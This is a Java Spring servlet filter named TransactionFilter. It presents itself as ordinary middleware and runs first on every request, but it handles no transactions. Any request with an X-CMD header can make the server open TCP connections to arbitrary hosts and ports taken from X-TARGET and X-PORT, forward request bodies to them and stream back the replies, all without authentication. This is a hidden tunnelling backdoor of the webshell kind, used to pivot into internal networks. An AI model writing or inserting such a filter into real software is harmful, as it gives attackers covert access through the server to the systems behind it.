import org.springframework.core.annotation.Order;
import org.springframework.stereotype.Component;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.UnknownHostException;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;

@Component
@Order(1)
public class TransactionFilter implements Filter {

    @Override
    public void doFilter(
            ServletRequest requestS,
            ServletResponse responseS,
            FilterChain chain) throws ServletException, IOException {

        HttpServletRequest request = (HttpServletRequest) requestS;
        HttpServletResponse response = (HttpServletResponse) responseS;
        HttpSession session = request.getSession();
        String cmd = request.getHeader("X-CMD");
        if (cmd != null) {
            response.setHeader("X-STATUS", "OK");
            if (cmd.compareTo("CONNECT") == 0) {
                try {
                    String target = request.getHeader("X-TARGET");
                    int port = Integer.parseInt(request.getHeader("X-PORT"));
                    SocketChannel socketChannel = SocketChannel.open();
                    socketChannel.connect(new InetSocketAddress(target, port));
                    socketChannel.configureBlocking(false);
                    session.setAttribute("socket", socketChannel);
                    response.setHeader("X-STATUS", "OK");
                } catch (UnknownHostException e) {
                    System.out.println(e.getMessage());
                    response.setHeader("X-ERROR", e.getMessage());
                    response.setHeader("X-STATUS", "FAIL");
                } catch (IOException e) {
                    System.out.println(e.getMessage());
                    response.setHeader("X-ERROR", e.getMessage());
                    response.setHeader("X-STATUS", "FAIL");

                }
            } else if (cmd.compareTo("DISCONNECT") == 0) {
                SocketChannel socketChannel = (SocketChannel) session.getAttribute("socket");
                try {
                    socketChannel.socket().close();
                } catch (Exception ex) {
                    System.out.println(ex.getMessage());
                }
                session.invalidate();
            } else if (cmd.compareTo("READ") == 0) {
                SocketChannel socketChannel = (SocketChannel) session.getAttribute("socket");
                try {
                    ByteBuffer buf = ByteBuffer.allocate(512);
                    int bytesRead = socketChannel.read(buf);
                    ServletOutputStream so = response.getOutputStream();
                    while (bytesRead > 0) {
                        so.write(buf.array(), 0, bytesRead);
                        so.flush();
                        buf.clear();
                        bytesRead = socketChannel.read(buf);
                    }
                    response.setHeader("X-STATUS", "OK");
                    so.flush();
                    so.close();

                } catch (Exception e) {
                    System.out.println(e.getMessage());
                    response.setHeader("X-ERROR", e.getMessage());
                    response.setHeader("X-STATUS", "FAIL");
                    //socketChannel.socket().close();
                }

            } else if (cmd.compareTo("FORWARD") == 0) {
                SocketChannel socketChannel = (SocketChannel) session.getAttribute("socket");
                try {

                    int readlen = request.getContentLength();
                    byte[] buff = new byte[readlen];

                    request.getInputStream().read(buff, 0, readlen);
                    ByteBuffer buf = ByteBuffer.allocate(readlen);
                    buf.clear();
                    buf.put(buff);
                    buf.flip();

                    while (buf.hasRemaining()) {
                        socketChannel.write(buf);
                    }
                    response.setHeader("X-STATUS", "OK");
                    //response.getOutputStream().close();

                } catch (Exception e) {
                    System.out.println(e.getMessage());
                    response.setHeader("X-ERROR", e.getMessage());
                    response.setHeader("X-STATUS", "FAIL");
                    socketChannel.socket().close();
                }
            }
        } else {
            //PrintWriter o = response.getWriter();
            System.out.println("123");
            chain.doFilter(request, response);
        }

    }

    // other methods
}

